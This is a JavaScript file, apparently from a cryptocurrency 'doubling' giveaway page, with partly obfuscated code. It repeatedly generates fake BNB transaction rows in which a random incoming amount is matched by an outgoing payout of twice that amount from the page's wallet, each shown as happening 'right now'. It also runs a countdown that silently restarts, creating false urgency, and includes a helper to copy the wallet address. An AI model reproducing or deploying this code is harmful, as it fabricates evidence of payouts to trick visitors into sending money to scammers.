function CopyToClipboard(id) {
  var r = document.createRange();
  r.selectNode(document.getElementById(id));
  window.getSelection().removeAllRanges();
  window.getSelection().addRange(r);
  document.execCommand("copy");
  window.getSelection().removeAllRanges();
  Toast.add({
    text: "Copied!",
    color: "#91d49f",
    autohide: true,
    delay: 2000,
  });
}

$(document).ready(function () {
  $("#nav-mb").on("click", "a", function (event) {
    event.preventDefault();
    var id = $(this).attr("href"),
      top = $(id).offset().top;
    $("body,html").animate(
      {
        scrollTop: top,
      },
      1500
    );
  });
});

function randomString(_0xe480x2) {
  var _0xe480x3 = "";
  var _0xe480x4 = "abcdefghijklmnopqrstuvwxyz0123456789";
  var _0xe480x5 = _0xe480x4["length"];
  for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
    _0xe480x3 += _0xe480x4["charAt"](
      Math["floor"](Math["random"]() * _0xe480x5)
    );
  }
  return _0xe480x3;
}

function randomStringHashBTC(_0xe480x2) {
  var _0xe480x3 = "";
  var _0xe480x4 = "bacfed0123456789";
  var _0xe480x5 = _0xe480x4["length"];
  for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
    _0xe480x3 += _0xe480x4["charAt"](
      Math["floor"](Math["random"]() * _0xe480x5)
    );
  }
  return _0xe480x3;
}

var divCounter = 0;

function randomInteger(min, max) {
  let rand = min + Math.random() * (max - min);
  return Math.round(rand);
}

function randomIntegerBTC(min, max) {
  let rand = min + Math.random() * (max - min);
  return rand.toFixed(2);
}

function getRundomMnogitel() {
  let asd = [1, 0.1, 0.01];
  let getRandom = Math.floor(Math.random() * asd.length);
  return asd[getRandom];
}

function genDiv() {
  divCounter++;
  let valet = document.getElementById("wallet").innerText;
  var _0xe480x9 = `${'<div class="item"><div class="top"><div class="data"><div style="display:none"; class="data-item">{t1}</div><div style="display:none"; class="data-item">{t2}</div><div class="data-item" id="btcstr">{t4}</div><div class="data-item">{t5}</div><div class="data-item">{t6}</div><div class="data-item">{t3}</div><div class="data-item">{t7}</div><div style="display:none"; class="data-item">{t8}</div></div></div><div class="bottom"><div class="data"><div style="display:none"; class="data-item">{b1}</div><div style="display:none"; class="data-item">{b2}</div><div class="data-item">{b4}</div><div class="data-item">{b5}</div><div class="data-item" id="btcstr">{b6}</div><div class="data-item">{b3}</div><div class="data-item">{b7}</div><div style="display:none"; class="data-item">{b8}</div></div></div></div>'}`;
  let _0xe480xa = randomStringHashBTC(10) + "...";
  let _0xe480xb =
    "616" + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9);
  let _0xe480xc = "right now";
  let _0xe480xd = "bnb" + randomString(9) + "...";
  let _0xe480xe = "IN";
  let _0xe480xf = valet.substring(0, 10);
  let valueSend = randomIntegerBTC(6, 300);
  let _0xe480x10 = valueSend + " BNB";
  let _0xe480x11 = (Math["random"]() * 0.009 * getRundomMnogitel() +
    0.0001 * getRundomMnogitel())["toFixed"](6);
  let _0xe480x12 = randomStringHashBTC(10) + "...";
  let _0xe480x13 =
    "616" + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9);
  let _0xe480x14 = "right now";
  let _0xe480x15 = _0xe480xf.slice(0, 10) + "...";
  let _0xe480x16 = "OUT";
  let _0xe480x17 = _0xe480xd;
  let _0xe480x18 = valueSend * 2 + " BNB";
  let _0xe480x19 = (Math["random"]() * 0.009 * getRundomMnogitel() +
    0.0001 * getRundomMnogitel())["toFixed"](8);
  _0xe480x9 = _0xe480x9["replace"]("{t1}", _0xe480x12);
  _0xe480x9 = _0xe480x9["replace"]("{t2}", _0xe480x13);
  _0xe480x9 = _0xe480x9["replace"]("{t3}", _0xe480x14);
  _0xe480x9 = _0xe480x9["replace"]("{t4}", _0xe480x15);
  _0xe480x9 = _0xe480x9["replace"]("{t5}", _0xe480x16);
  _0xe480x9 = _0xe480x9["replace"]("{t6}", _0xe480x17);
  _0xe480x9 = _0xe480x9["replace"]("{t7}", _0xe480x18);
  _0xe480x9 = _0xe480x9["replace"]("{t8}", _0xe480x19);
  _0xe480x9 = _0xe480x9["replace"]("{b1}", _0xe480xa);
  _0xe480x9 = _0xe480x9["replace"]("{b2}", _0xe480xb);
  _0xe480x9 = _0xe480x9["replace"]("{b3}", _0xe480xc);
  _0xe480x9 = _0xe480x9["replace"]("{b4}", _0xe480xd);
  _0xe480x9 = _0xe480x9["replace"]("{b5}", _0xe480xe);
  _0xe480x9 = _0xe480x9["replace"]("{b6}", _0xe480x15);
  _0xe480x9 = _0xe480x9["replace"]("{b7}", _0xe480x10);
  _0xe480x9 = _0xe480x9["replace"]("{b8}", _0xe480x11);
  var _0xe480x1a = $(_0xe480x9)["prependTo"](".table-body");
  $(".item")["each"](function () {
    var _0xe480x6 = $(this)["index"]();
    if (_0xe480x6 > 0) {
      $(this)
        ["find"](".top .data div")
        ["eq"](5)
        ["html"](_0xe480x6 + " min");
      $(this)
        ["find"](".bottom .data div")
        ["eq"](5)
        ["html"](_0xe480x6 + " min");
    }
  });
  setTimeout(function () {
    _0xe480x1a["find"](".top")["fadeIn"]();
    _0xe480x1a["find"](".bottom .data div")["eq"](5)["html"]("right now");
  }, 2000);
}

$(document)["ready"](function () {
  genDiv();
  setInterval(function () {
    genDiv();
  }, 15500);
});

let timeCount = document.getElementById("overTime").innerText;

function getTimeRemaining(endtime) {
  var t = Date.parse(endtime) - Date.parse(new Date());
  var seconds = Math.floor((t / 1000) % 60);
  var minutes = Math.floor((t / 1000 / 60) % 60);
  var hours = Math.floor((t / (1000 * 60 * 60)) % 24);
  var days = Math.floor(t / (1000 * 60 * 60 * 24));
  sessionStorage.setItem("timeOver", t / 1000);
  return {
    total: t,
    days: days,
    hours: hours,
    minutes: minutes,
    seconds: seconds,
  };
}

var storageTime = sessionStorage.getItem("timeOver");
var defaultVal = timeCount;

function initializeClock(id, endtime) {
  var clock = document.getElementById(id);
  var daysSpan = clock.querySelector(".days");
  var hoursSpan = clock.querySelector(".hours");
  var minutesSpan = clock.querySelector(".minutes");
  var secondsSpan = clock.querySelector(".seconds");

  function updateClock() {
    var t = getTimeRemaining(endtime);

    if (t.total <= 0) {
      clearInterval(timeinterval);
      var deadline = new Date(Date.parse(new Date()) + (defaultVal + 1) * 1000);
      initializeClock("countdown", deadline);
    }

    daysSpan.innerHTML = "0" + t.days;
    hoursSpan.innerHTML = ("0" + t.hours).slice(-2);
    minutesSpan.innerHTML = ("0" + t.minutes).slice(-2);
    secondsSpan.innerHTML = ("0" + t.seconds).slice(-2);
  }

  updateClock();
  var timeinterval = setInterval(updateClock, 1000);
}

if (storageTime) {
  var deadline = new Date(Date.parse(new Date()) + storageTime * 1000);
  initializeClock("countdown", deadline);
} else {
  var deadline = new Date(Date.parse(new Date()) + defaultVal * 1000);
  initializeClock("countdown", deadline);
}

$(document).ready(function () {
  $(".btn-it-l").click(function () {
    $(this).next(".box-content-l").slideToggle();
  });
});
$(".btn-it-l").click(function (event) {
  $(this).toggleClass("before-min");
  $(this).parent().toggleClass("before-min");
});
